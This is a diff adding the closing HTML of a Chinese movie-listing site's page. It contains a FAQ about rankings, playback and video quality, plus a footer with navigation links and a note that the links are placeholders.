+    </div>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>常见问题</h2>
+        <p>关于播放、清晰度、更新节奏的几个高频疑问。</p>
+      </div>
+    </div>
+    <div class="faq">
+      <details open>
+        <summary>热播榜多久更新一次？</summary>
+        <p>每六小时重算一次，统计过去 24 小时的站内播放完成度、短评数量和收藏数，新片上线当天会单独标注"新上榜"。</p>
+      </details>
+      <details>
+        <summary>手机看要装播放器吗？</summary>
+        <p>不用。页面直接用浏览器播放，安卓和 iOS 都适配过，横屏后自动进入全屏模式，进度条拖到哪儿就从哪儿缓冲。</p>
+      </details>
+      <details>
+        <summary>1080P 和 4K 怎么切换？</summary>
+        <p>进入播放页后点右下角的清晰度按钮切换。网络较差时建议先选 1080P，稳定后再切 4K，切换不会从头开始播。</p>
+      </details>
+      <details>
+        <summary>找不到想看的片子怎么办？</summary>
+        <p>可以先在类型索引里按题材和年份筛，仍查不到的话说明暂未收录，我们会在每周三、周六的补充更新里集中处理。</p>
+      </details>
+      <details>
+        <summary>短评会被折叠吗？</summary>
+        <p>少于 60 字、包含剧透未标注、或重复内容的短评会被折叠。标注"含剧透"的评论默认折叠，点开才显示正文。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div class="f-about">
+        <h4>关于热播电影网</h4>
+        <p>热播电影网从 2019 年开始更新，做的是一件小事：把分散在各地的热播影视信息整理成榜单、排片和短评三张表，让人打开一页就知道今晚看什么。</p>
+        <p style="margin-top:10px">网址：<span class="u">https://rebodianyingwang-app.github.io</span></p>
+      </div>
+      <div>
+        <h4>看片入口</h4>
+        <a href="#hot">今日热播榜</a>
+        <a href="#type">类型索引</a>
+        <a href="#schedule">排片时刻表</a>
+        <a href="#review">影评短评</a>
+      </div>
+      <div>
+        <h4>热门类型</h4>
+        <a href="#type">动作片</a>
+        <a href="#type">科幻片</a>
+        <a href="#type">悬疑片</a>
+        <a href="#type">动画片</a>
+      </div>
+      <div>
+        <h4>站点相关</h4>
+        <a href="#faq">常见问题</a>
+        <a href="#news">更新日志</a>
+        <a href="#">意见反馈</a>
+        <a href="#">内容投诉</a>
+      </div>
+    </div>
+    <div class="bottom">
+      <span>&copy; 2026 热播电影网 rebodianyingwang-app.github.io 保留所有权利</span>
+      <span>页面内链接均为占位，实际栏目上线后替换</span>
+    </div>
+  </div>
+</footer>
+
+<a class="totop" href="#" aria-label="回到顶部">&uarr;</a>
+
+</body>
+</html>
